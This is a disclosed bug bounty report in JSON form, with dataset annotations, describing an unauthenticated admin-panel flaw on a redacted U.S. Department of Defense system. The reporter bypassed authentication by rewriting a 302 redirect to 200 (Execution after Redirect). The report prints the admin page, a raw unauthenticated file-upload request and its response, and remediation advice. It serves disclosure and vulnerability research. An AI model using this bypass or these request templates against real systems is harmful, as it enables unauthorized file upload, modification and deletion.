{
  "reported_to": "U.S. Dept Of Defense",
  "reported_by": "palaziv ",
  "title": "Unauthenticated Access to Admin Panel Functions at https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588/\u2588\u2588\u2588",
  "content": "\nDescription:\nThe admin panel at https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 and all its functions can be accessed without authentication. This is basically the same vulnerability as in #1394910, just on another system.\nImpact\nAn attacker is able to use the administrative functions in order to upload, delete or modify files.\nSystem Host(s)\n\u2588\u2588\u2588\nAffected Product(s) and Version(s)\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\nCVE Numbers\nSteps to Reproduce\nNavigate to https://\u2588\u2588\u2588/ and click on the \"Authenticate \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\" button\nNotice how the application first sends an HTTP POST request to https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588/\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 which should redirect to https://\u2588\u2588\u2588\u2588\u2588\u2588/\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (Location: \u2588\u2588\u2588\u2588\u2588). Navigating to https://\u2588\u2588\u2588/\u2588\u2588\u2588\u2588\u2588\u2588 redirects to https://\u2588\u2588\u2588\u2588\u2588/\u2588\u2588\u2588\nLooking at the response to https://\u2588\u2588\u2588\u2588\u2588/\u2588\u2588\u2588 I noticed that even though the server sent back a 302 status code with a header Location: /\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 the response was quite long\nI browsed to https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588, intercepted the response in Burp, changed the status code from 302 Found to 200 OK and was presented with the admin panel (this kind of attack is called Execution after Redirect). Below you can see the unmodified response containing links to the \u2588\u2588\u2588\u2588\u2588\u2588 Admin Functions:\nCode 4.75 KiB\n1HTTP/1.1 302 Found\n2Date: Wed, 10 Nov 2021 14:28:15 GMT\n3Content-Type: text/html; charset=UTF-8\n4Connection: close\n5Cache-Control: no-store, no-cache, must-revalidate\n6Expires: Thu, 19 Nov 1981 08:52:00 GMT\n7Location: /\u2588\u2588\u2588\u2588\u2588\u2588\n8Pragma: no-cache\n9Set-Cookie: \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588; path=/; HttpOnly\n10Set-Cookie: \u2588\u2588\u2588\u2588\u2588\u2588\u2588; Path=/; HttpOnly; Secure\n11X-Vcap-Request-Id: 3c110e5d-196e-46f4-503d-222157e0c465\n12Strict-Transport-Security: max-age=31536000; includeSubDomains\n13\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n14Content-Length: 4266\n15\n16\n17<!-- Unused LIMDIS banner in WWW  \n18\n19<table align=\"center\" width=\"800\" border=\"1\" cellspacing=\"1\"\n20\tcellpadding=\"1\" bgcolor=\"#008000\">\n21\t<tr>\n22\t\t<td style=\"color: #FFF\";  align=\"center\">LIMITED DISTRIBUTION<br> <font\n23\t\t\tsize=\"2px\">Distribution authorized to DoD, IAW 10 U.S.C. \u00a7\u00a7 130 &\n24\t\t\t\t455. Release authorized to U.S. DoD contractors, IAW 48 C.F.R. \u00a7\n25\t\t\t\t252.245-7000. Refer other requests to: Headquarters, \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588, ATTN:\n26\t\t\t\tRelease Of ficer, \u2588\u2588\u2588\u2588\u2588\u2588\u2588, \u2588\u2588\u2588\u2588\u2588\u2588,\n27\t\t\t\t\u2588\u2588\u2588\u2588\u2588. Destroy IAW DoDI 5030.59. Removal of this caveat is\n28\t\t\t\tprohibited.</font></td>\n29\t</tr>\n30</table>\n31--><!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\">\n32<html lang='en' xmlns=\"http://www.w3.org/1999/xhtml\">\n33<head>\n34<meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\" />\n35<title>Admin</title>\n36<script src=\"../\u2588\u2588\u2588\u2588\u2588\u2588\u2588/SpryAssets/SpryMenuBar.js\" type=\"text/javascript\"></script>\n37<link href=\"../\u2588\u2588\u2588\u2588\u2588/SpryAssets/SpryMenuBarHorizontal.css\"\n38\trel=\"stylesheet\" type=\"text/css\" />\n39</head>\n40\n41<body>\n42\t<table align=\"center\" bgcolor=\"50D6EE\" border=\"3\">\n43\t\t<tr>\n44\t\t\t<td colspan=\"2\" align=\"center\"><img\n45\t\t\t\tsrc=\"../\u2588\u2588\u2588\u2588\u2588\u2588\u2588/images/\u2588\u2588\u2588_banner_top.jpg\" /></td>\n46\t\t</tr>\n47\t\t<tr>\n48\t\t\t<td align=\"center\"><br />\n49            Welcome to \u2588\u2588\u2588  You are on World Wide Web<br /></td>\n50\t\t</tr>\n51\t\t<tr>\n52\t\t\t<td>\n53\t\t\t\t<div align=\"center\">\n54\t\t\t\t\t<ul id=\"MenuBar1\" class=\"MenuBarHorizontal\">\n55\t\t\t\t\t\t<li><a class=\"MenuBarItemSubmenu\" href=\"#\">Home</a></li>\n56\t\t\t\t\t\t<li><a class=\"MenuBarItemSubmenu\" href=\"#\">\u2588\u2588\u2588\u2588\u2588 Admin Functions</a>\n57\t\t\t\t\t\t\t<ul>\n58\t\t\t\t\t\t\t\t<li><a href=\"s3html.php\">UpLoad Weekly</a></li>\n59\t\t\t\t\t\t\t\t<li><a href=\"../\u2588\u2588\u2588/\u2588\u2588\u2588\u2588\u2588\u2588/verifyfile.php\">Verify File Dates</a></li>\n60\t\t\t\t\t\t\t\t<li><a href=\"#\">Add Single File</a>\n61\t\t\t\t\t\t\t\t\t<ul>\n62\t\t\t\t\t\t\t\t\t\t<li><a href=\"../\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/addnewfile.php\" target=\"new\">VDU ADD\n63\t\t\t\t\t\t\t\t\t\t</a></li>\n64\t\t\t\t\t\t\t\t\t\t<li><a href=\"../\u2588\u2588\u2588\u2588\u2588\u2588/\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/addvpf.php\" target=\"new\">VPF ADD</a></li>\n65\t\t\t\t\t\t\t\t\t\t<li><a href=\"../\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/\u2588\u2588\u2588\u2588\u2588/\u2588\u2588\u2588\u2588\u2588class.php\" target=\"new\">Change\n66\t\t\t\t\t\t\t\t\t\t\t\tClassification</a></li>\n67\t\t\t\t\t\t\t\t\t\t<li><a href=\"../\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/\u2588\u2588\u2588\u2588\u2588\u2588/\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588bull.php\">New \u2588\u2588\u2588</a></li>\n68\t\t\t\t\t\t\t\t\t\t<li><a href=\"../\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/\u2588\u2588\u2588\u2588\u2588\u2588\u2588loadgraph.php\" target=\"new\">Graphic\n69\t\t\t\t\t\t\t\t\t\t\t\tADD</a></li>\n70\t\t\t\t\t\t\t\t\t\t<li><a href=\"../\u2588\u2588\u2588\u2588\u2588\u2588/\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/\u2588\u2588\u2588\u2588\u2588\u2588delgrp.php\">Delete 'ALL' Graphic\n71\t\t\t\t\t\t\t\t\t\t\t\tFiles</a></li>\n72\t\t\t\t\t\t\t\t\t</ul></li>\n73\t\t\t\t\t\t\t\t<li><a href=\"#\">Upload New Editions</a>\n74\t\t\t\t\t\t\t\t\t<ul>\n75\t\t\t\t\t\t\t\t\t\t<li><a href=\"../\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/\u2588\u2588\u2588\u2588\u2588/\u2588\u2588\u2588\u2588\u2588\u2588loadvdu.php\" target=\"new\">Install\n76\t\t\t\t\t\t\t\t\t\t\t\tNew Base VDU </a></li>\n77\t\t\t\t\t\t\t\t\t\t<li><a href=\"../\u2588\u2588\u2588/\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/\u2588\u2588\u2588\u2588\u2588loadvpf.php\" target=\"new\">Install\n78\t\t\t\t\t\t\t\t\t\t\t\tNew base VPF </a></li>\n79\t\t\t\t\t\t\t\t\t\t<li><a href=\"../\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/\u2588\u2588\u2588\u2588\u2588\u2588\u2588loadtxt.php\" target=\"new\">Install/Update\n80\t\t\t\t\t\t\t\t\t\t\t\t\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588##.txt</a></li>\n81\t\t\t\t\t\t\t\t\t\t<li><a href=\"../\u2588\u2588\u2588\u2588\u2588\u2588\u2588/\u2588\u2588\u2588\u2588\u2588\u2588\u2588/\u2588\u2588\u2588\u2588\u2588\u2588\u2588newgraph.php\" target=\"new\">Replace\n82\t\t\t\t\t\t\t\t\t\t\t\tall Graphic Files</a></li>\n83\t\t\t\t\t\t\t\t\t</ul></li>\n84\t\t\t\t\t\t\t\t<li><a href=\"#\">Modify Single File**</a>\n85\t\t\t\t\t\t\t\t\t<ul>\n86\t\t\t\t\t\t\t\t\t\t<li><a href=\"../\u2588\u2588\u2588\u2588\u2588\u2588/\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/\u2588\u2588\u2588\u2588\u2588\u2588mod.php\">Modify \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 Chart</a></li>\n87\t\t\t\t\t\t\t\t\t\t<li><a href=\"../\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/\u2588\u2588\u2588\u2588\u2588\u2588\u2588/\u2588\u2588\u2588\u2588\u2588vitem.php\">Modify Library Specific\n88\t\t\t\t\t\t\t\t\t\t\t\tFile</a></li>\n89\t\t\t\t\t\t\t\t\t\t<li><a href=\"../\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/\u2588\u2588\u2588/\u2588\u2588\u2588\u2588\u2588viteml.php\">Stop ALL VPFS from\n90\t\t\t\t\t\t\t\t\t\t\t\tbeing viewed from specific Region</a></li>\n91\t\t\t\t\t\t\t\t\t\t<li><a href=\"../\u2588\u2588\u2588\u2588\u2588/\u2588\u2588\u2588/\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588graphic.php\">Modify Graphic\n92\t\t\t\t\t\t\t\t\t\t\t\tSpecific File</a></li>\n93\t\t\t\t\t\t\t\t\t</ul></li>\n94\t\t\t\t\t\t\t\t<li><a href=\"../\u2588\u2588\u2588\u2588\u2588\u2588\u2588/\u2588\u2588\u2588\u2588/\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588vpfdel.php\">DELETE VPF, VDU,\n95\t\t\t\t\t\t\t\t\t\tGraphics</a></li>\n96\t\t\t\t\t\t\t\t<li><a href=\"#\">Change Status of Deleted and New Records</a>\n97\t\t\t\t\t\t\t\t\t<ul>\n98\t\t\t\t\t\t\t\t\t\t<li><a href=\"../\u2588\u2588\u2588\u2588/\u2588\u2588\u2588\u2588\u2588/\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588deldel.php\">Change Record Status\n99\t\t\t\t\t\t\t\t\t\t\t\tTo an ADDed or DELeted VDU Record</a></li>\n100\t\t\t\t\t\t\t\t\t</ul></li>\n101\t\t\t\t\t\t\t\t<li><a href=\"../\u2588\u2588\u2588\u2588/\u2588\u2588\u2588\u2588\u2588/\u2588\u2588\u2588\u2588\u2588_documentation.php\">\u2588\u2588\u2588\u2588\n102\t\t\t\t\t\t\t\t\t\tDocumentation</a></li>\n103\t\t\t\t\t\t\t</ul></li>\n104\t\t\t\t\t\t<li><a href=\"dssLogout.php\">Logout</a></li>\n105\t\t\t\t\t</ul>\n106\t\t\t\t</div>\n107\t\t\t\t<p>&nbsp;</p>\n108\t\t\t\t<p>&nbsp;</p>\n109\t\t\t\t<p>\n110\t\t\t\t\t<br /> <br />\n111\t\t\t\t</p>\n112\t\t\t</td>\n113\t\t</tr>\n114\t\t<tr>\n115\t\t\t<td><br /> <br /></td>\n116\t\t</tr>\n117\t\t<tr align=\"center\">\n118\t\t</tr>\n119\t</table>\n120\t<script type=\"text/javascript\">\n121    var MenuBar1 = new Spry.Widget.MenuBar(\"MenuBar1\", {imgDown:\"../SpryAssets/SpryMenuBarDownHover.gif\", imgRight:\"../SpryAssets/SpryMenuBarRightHover.gif\"});\n122</script>\n123</body>\n124</html>\n125\nThe functions allow to upload, modify and to delete \u2588\u2588\u2588\u2588\u2588 files and can all be used completely unauthenticated. Following an example in which I upload a file; this upload function can be accessed from https://\u2588\u2588\u2588\u2588\u2588/\u2588\u2588\u2588\u2588\u2588\u2588/\u2588\u2588\u2588\u2588/\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588bull.php. Note that the request has no session cookie:\nCode 1.06 KiB\n1POST /\u2588\u2588\u2588\u2588/\u2588\u2588\u2588\u2588\u2588\u2588\u2588/\u2588\u2588\u2588\u2588\u2588\u2588\u2588bulla.php HTTP/1.1\n2Host: \u2588\u2588\u2588\u2588\u2588\n3Content-Length: 401\n4Cache-Control: max-age=0\n5Upgrade-Insecure-Requests: 1\n6Origin: https://\u2588\u2588\u2588\u2588\u2588\n7Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryVxWfTBx5ZkXMXVG2\n8User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36\n9Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\n10Referer: https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588/\u2588\u2588\u2588\u2588\u2588/\u2588\u2588\u2588\u2588/\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588bull.php\n11Accept-Encoding: gzip, deflate\n12Accept-Language: en-US,en;q=0.9\n13Connection: close\n14X-Bug-Bounty: HackerOne-palaziv\n15X-Bug-Bounty: BurpSuitePro\n16\n17------WebKitFormBoundaryVxWfTBx5ZkXMXVG2\n18Content-Disposition: form-data; name=\"bdate\"\n19\n201970-01-01\n21------WebKitFormBoundaryVxWfTBx5ZkXMXVG2\n22Content-Disposition: form-data; name=\"userfile1\"; filename=\"test.txt\"\n23Content-Type: text/plain\n24\n25test\n26\n27------WebKitFormBoundaryVxWfTBx5ZkXMXVG2\n28Content-Disposition: form-data; name=\"buttonm\"\n29\n30Begin Uploads\n31------WebKitFormBoundaryVxWfTBx5ZkXMXVG2--\nResponse:\nCode 843 Bytes\n1HTTP/1.1 302 Found\n2Date: Wed, 10 Nov 2021 14:44:57 GMT\n3Content-Type: text/html; charset=UTF-8\n4Connection: close\n5Cache-Control: no-store, no-cache, must-revalidate\n6Expires: Thu, 19 Nov 1981 08:52:00 GMT\n7Location: ../../\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/404.html\n8Pragma: no-cache\n9Set-Cookie: JSESSIONID=fceoa3cccho3q5dc6ahec3ghav; path=/; HttpOnly\n10Set-Cookie: \u2588\u2588\u2588; Path=/; HttpOnly; Secure\n11X-Vcap-Request-Id: ffb083d0-f29b-4623-5249-9f015b9cc59f\n12Strict-Transport-Security: max-age=31536000; includeSubDomains\n13Set-Cookie: TS01b8cd54=01dc86b24807c4064ee7333f073dd2db329d550bf5a80b061306a56af136c21560cefb7fa74dbd19a258797185afd48dfdfb9f2dca; Path=/; Domain=.\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n14Content-Length: 173\n15\n<image_0>\nThis uploaded file can be downloaded again on https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588.\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/\u2588\u2588\u2588\u2588/\u2588\u2588\u2588/\u2588\u2588\u2588.php (another system) by clicking on the \"\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 \u2588\u2588\u2588\u2588\u2588\u2588\u2588\" link: https://\u2588\u2588\u2588\u2588\u2588\u2588.\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/downloadS3File.php?file=\u2588\u2588\u2588%2F\u2588\u2588\u2588\u2588\u2588\u2588SiteContent%2F\u2588\u2588\u2588\u2588\u2588\u2588\u2588.zip\nSuggested Mitigation/Remediation Actions\nImplement proper access controls.\nMitigation for the Execution after Redirect vulnerability: Proper termination should be performed after redirects. In a function a return should be performed. In other instances functions such as die() should be performed. This will tell the application to terminate regardless of if the page is redirected or not.\n\n",
  "severity": [
    9.0,
    10.0
  ],
  "bounty": null,
  "weaknesses": [
    "Improper Access Control - Generic"
  ],
  "screenshots": {
    "image_0": "16<br>Upload SUCCESS!<br>S3 ObjectURL: https://pcf-om-mil-86e7ccdd-b099-4b50-aad2-cad52466327b.s3.amazonaws.com/\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/\u2588\u2588\u2588\u2588\u2588\u2588\u2588SiteContent/\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588.zip<br>error in \u2588\u2588\u2588\u2588\u2588 table "
  },
  "disclosed_date": 1638242160,
  "report_url": "https://hackerone.com/reports/1397564",
  "is_multi_component": true,
  "complexity": "MEDIUM",
  "novelty": "LOW",
  "vuln_category": "WEB_APP",
  "steps": [
    [
      1,
      "Navigate to the admin panel URL and intercept the response using a tool like Burp Suite."
    ],
    [
      2,
      "Modify the response status code from 302 Found to 200 OK to bypass the redirect and access the admin panel."
    ]
  ],
  "vuln_description": "The admin panel and all its functions can be accessed without authentication due to a flaw in the redirect mechanism. By intercepting and modifying the HTTP response, an attacker can bypass authentication and perform administrative actions such as uploading, deleting, or modifying files.",
  "reason": "The vulnerability involves intercepting and modifying a single HTTP response to bypass authentication. While the attack requires some knowledge of HTTP protocols and tools like Burp Suite, the steps are straightforward and do not involve complex interactions or novel logic.",
  "new_complexity": "LOW",
  "requires_code": false,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": "1394910",
  "idor_detectable": false,
  "authnz_byppass_detectable": true,
  "is_simple_payload": false,
  "injection_metadata": {
    "is_simple_payload": false
  },
  "authnz_metadata": {
    "reason": "The vulnerability involves unauthenticated access to admin panel functions, which falls under the AuthN/AuthZ Bypass category. The methodology described includes testing actions with unauthenticated user sessions (step d), which would detect this vulnerability by attempting to access admin functions without proper authentication.",
    "is_detectable": true
  }
}